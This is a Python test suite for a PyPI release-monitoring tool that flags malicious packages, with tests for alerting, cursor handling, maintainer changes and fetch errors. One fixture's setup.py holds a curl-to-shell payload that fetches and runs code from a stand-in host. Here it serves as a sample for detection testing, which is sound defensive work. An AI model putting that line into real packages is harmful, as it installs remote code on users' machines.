import os, subprocess
from pydiffwatch import ingest, fetcher, orchestrator, store
from pydiffwatch.models import NewRelease
from tests.fixtures.build_fixtures import make_sdist

BENIGN = make_sdist({"setup.py": b"from setuptools import setup\nsetup(name='victim')\n",
                     "victim/__init__.py": b"VERSION='1.0'\n"})
MALICIOUS = make_sdist({"setup.py": b"import os\nos.system('curl http://evil.sh|sh')\n",
                        "victim/__init__.py": b"VERSION='1.1'\n"})
SAFE = make_sdist({"setup.py": b"from setuptools import setup\nsetup(name='safe')\n",
                   "safe/__init__.py": b"def add(a,b):\n    return a+b\n"})

def _meta(pkg, versions):   # versions: list of (ver, iso_ts) -> synthetic PyPI package JSON
    return {"releases": {v: [{"packagetype": "sdist", "url": f"mock://{pkg}/{v}",
            "upload_time_iso_8601": ts, "yanked": False}] for v, ts in versions}}

def test_e2e_alerts_on_malicious_only(tmp_cfg, monkeypatch):
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        NewRelease("victim", "1.0", 10), NewRelease("victim", "1.1", 11),
        NewRelease("safe", "1.0", 12)])
    blobs = {("victim", "1.0"): BENIGN, ("victim", "1.1"): MALICIOUS, ("safe", "1.0"): SAFE}
    metas = {"victim": _meta("victim", [("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]),
             "safe": _meta("safe", [("1.0", "2026-01-01T00:00:00Z")])}
    monkeypatch.setattr(fetcher, "_package_json", lambda pkg, cfg: metas[pkg])
    monkeypatch.setattr(fetcher, "_download",
                        lambda url, cfg: blobs[tuple(url.replace("mock://", "").split("/"))])
    # containment guard: analysis must never execute package code
    monkeypatch.setattr(os, "system", lambda *a: (_ for _ in ()).throw(AssertionError("os.system called")))
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: (_ for _ in ()).throw(AssertionError("subprocess.run called")))

    n = orchestrator.run_once(tmp_cfg, seed_if_fresh=False)
    assert n == 3
    conn = store.connect(tmp_cfg)
    rows = conn.execute("SELECT classification FROM alerts").fetchall()
    pkgs = conn.execute("""SELECT r.package, r.version FROM alerts a
                           JOIN releases r ON r.id=a.release_id""").fetchall()
    assert ("victim", "1.1") in [tuple(p) for p in pkgs]   # malicious alerted
    assert ("safe", "1.0") not in [tuple(p) for p in pkgs] # benign silent
    assert len(rows) == 1
    conn.close()
    # idempotency: second run adds no new alerts
    orchestrator.run_once(tmp_cfg)
    conn = store.connect(tmp_cfg)
    assert conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0] == 1

def test_cursor_resume_across_runs(tmp_cfg, monkeypatch):
    # First run sees one release; second run sees a NEW release at a higher serial.
    # The cursor must advance and the second release must be processed (no gap, no reprocess).
    metas = {"victim": _meta("victim", [("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")])}
    monkeypatch.setattr(fetcher, "_package_json", lambda pkg, cfg: metas[pkg])
    blobs = {("victim", "1.0"): BENIGN, ("victim", "1.1"): MALICIOUS}
    monkeypatch.setattr(fetcher, "_download",
                        lambda url, cfg: blobs[tuple(url.replace("mock://", "").split("/"))])

    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        r for r in [type("R", (), {"package": "victim", "version": "1.0", "serial": 10})()]
        if r.serial > since])
    orchestrator.run_once(tmp_cfg, seed_if_fresh=False)
    conn = store.connect(tmp_cfg)
    assert store.get_last_serial(conn) == 10
    conn.close()

    # second run: a new release at serial 11; changes_since must only see it (since=10)
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        r for r in [type("R", (), {"package": "victim", "version": "1.1", "serial": 11})()]
        if r.serial > since])
    n = orchestrator.run_once(tmp_cfg)
    assert n == 1                      # only the new release processed
    conn = store.connect(tmp_cfg)
    assert store.get_last_serial(conn) == 11
    cnt = conn.execute("SELECT COUNT(*) FROM releases").fetchone()[0]
    assert cnt == 2                    # both releases recorded, none duplicated
    conn.close()

def test_first_release_processed(tmp_cfg, monkeypatch):
    # A package seen for the first time (no prior version) must process via the first-release path.
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        NewRelease("brandnew", "1.0", 5)])
    monkeypatch.setattr(fetcher, "_package_json", lambda pkg, cfg: _meta("brandnew", [("1.0", "2026-01-01T00:00:00Z")]))
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: SAFE)
    n = orchestrator.run_once(tmp_cfg, seed_if_fresh=False)
    assert n == 1
    conn = store.connect(tmp_cfg)
    row = conn.execute("SELECT is_first_release, prior_version FROM releases "
                       "WHERE package='brandnew'").fetchone()
    assert row[0] == 1 and row[1] is None    # single PyPI version -> new package, no prior baseline
    conn.close()

def test_e2e_maintainer_metadata_persisted_and_change_detected(tmp_cfg, monkeypatch):
    # tick 1 records who shipped v1; tick 2 (ownership changed) must fire maintainer-set-change.
    b1 = make_sdist({"setup.py": b"from setuptools import setup\nsetup(name='acme')\n",
                     "acme/__init__.py": b"V='1.0'\n"})
    b2 = make_sdist({"setup.py": b"from setuptools import setup\nsetup(name='acme')\n",
                     "acme/__init__.py": b"V='1.1'\n"})
    blobs = {("acme", "1.0"): b1, ("acme", "1.1"): b2}
    monkeypatch.setattr(fetcher, "_download",
                        lambda url, cfg: blobs[tuple(url.replace("mock://", "").split("/"))])
    state = {"owners": ["alice"]}   # current PyPI owner set, mutated between ticks
    def pkg_json(pkg, cfg):
        return {"releases": {v: [{"packagetype": "sdist", "url": f"mock://acme/{v}",
                "upload_time_iso_8601": ts, "yanked": False}]
                for v, ts in [("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]},
                "info": {"author": "acme", "maintainer": None},
                "ownership": {"roles": [{"role": "Owner", "user": u} for u in state["owners"]]}}
    monkeypatch.setattr(fetcher, "_package_json", pkg_json)

    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        r for r in [NewRelease("acme", "1.0", 10)] if r.serial > since])
    orchestrator.run_once(tmp_cfg, seed_if_fresh=False)              # tick 1: owners {alice}
    conn = store.connect(tmp_cfg)
    assert store.get_release_metadata(conn, "acme", "1.0") == {
        "author": "acme", "maintainer": None, "roles": ["alice"], "upload_time": "2026-01-01T00:00:00Z"}
    conn.close()

    state["owners"] = ["alice", "mallory"]                          # ownership changes
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        r for r in [NewRelease("acme", "1.1", 11)] if r.serial > since])
    orchestrator.run_once(tmp_cfg)                                   # tick 2: diffs vs stored v1 owners
    conn = store.connect(tmp_cfg)
    rules = conn.execute("SELECT triage_rules FROM releases WHERE package='acme' AND version='1.1'").fetchone()[0]
    assert "maintainer-set-change" in rules
    assert set(store.get_release_metadata(conn, "acme", "1.1")["roles"]) == {"alice", "mallory"}
    conn.close()

def test_refused_extract_emits_suspicious_alert(tmp_cfg, monkeypatch):
    # A package whose sdist cannot be safely extracted must produce a suspicious alert (spec §8).
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [
        NewRelease("bomb", "1.0", 7)])
    # make extraction refuse by patching fetch_artifacts directly
    monkeypatch.setattr(fetcher, "fetch_artifacts",
                        lambda cfg, rel: (_ for _ in ()).throw(fetcher.RefusedToExtract("bomb")))
    orchestrator.run_once(tmp_cfg, seed_if_fresh=False)
    conn = store.connect(tmp_cfg)
    stage = conn.execute("SELECT stage FROM releases WHERE package='bomb'").fetchone()[0]
    alert = conn.execute("""SELECT a.classification FROM alerts a
                            JOIN releases r ON r.id=a.release_id WHERE r.package='bomb'""").fetchone()
    assert stage == "refused_to_extract"
    assert alert is not None and alert[0] == "suspicious-heuristic"
    conn.close()

def test_transient_fetch_error_is_retryable_not_poison(tmp_cfg, monkeypatch):
    # A transient (non-RefusedTo*) error mid-batch must NOT abort the tick, must NOT advance the
    # cursor past the failed release, and must be reprocessed+alerted on a later tick (no silent drop).
    import urllib.error
    good = NewRelease("good", "1.0", 10)
    boom = NewRelease("victimx", "1.1", 11)
    after = NewRelease("after", "1.0", 12)
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [r for r in [good, boom, after] if r.serial > since])

    calls = {"n": 0}
    def flaky_fetch(cfg, rel):
        if rel.package == "victimx" and calls["n"] == 0:
            calls["n"] += 1
            raise urllib.error.HTTPError("u", 503, "boom", {}, None)  # transient, NOT RefusedTo*
        # success path: build a real ArtifactSet via the normal extract on a benign/malicious blob
        blob = MALICIOUS if rel.package == "victimx" else SAFE
        from pydiffwatch.models import ArtifactSet
        files, bins = fetcher.extract_sdist(blob, cfg)
        return ArtifactSet(rel.package, rel.version, None, "sdist", files, {}, {}, bins)
    monkeypatch.setattr(fetcher, "fetch_artifacts", flaky_fetch)

    n1 = orchestrator.run_once(tmp_cfg, seed_if_fresh=False)   # tick 1: good ok, victimx fails transiently
    assert n1 == 3
    conn = store.connect(tmp_cfg)
    # cursor must NOT have advanced past the failed release (still at 10, the last contiguous terminal)
    assert store.get_last_serial(conn) == 10
    # victimx recorded but in a retryable stage, no alert yet
    assert store.get_stage(conn, "victimx", "1.1") == "fetch_failed"
    assert conn.execute("SELECT COUNT(*) FROM alerts a JOIN releases r ON r.id=a.release_id "
                        "WHERE r.package='victimx'").fetchone()[0] == 0
    conn.close()

    n2 = orchestrator.run_once(tmp_cfg)             # tick 2: changes_since(10) returns victimx+after; victimx now succeeds
    conn = store.connect(tmp_cfg)
    assert store.get_stage(conn, "victimx", "1.1") in ("triaged", "alerted")
    assert conn.execute("SELECT COUNT(*) FROM alerts a JOIN releases r ON r.id=a.release_id "
                        "WHERE r.package='victimx'").fetchone()[0] == 1   # malicious now alerted
    assert store.get_last_serial(conn) == 12        # cursor caught up after success
    conn.close()
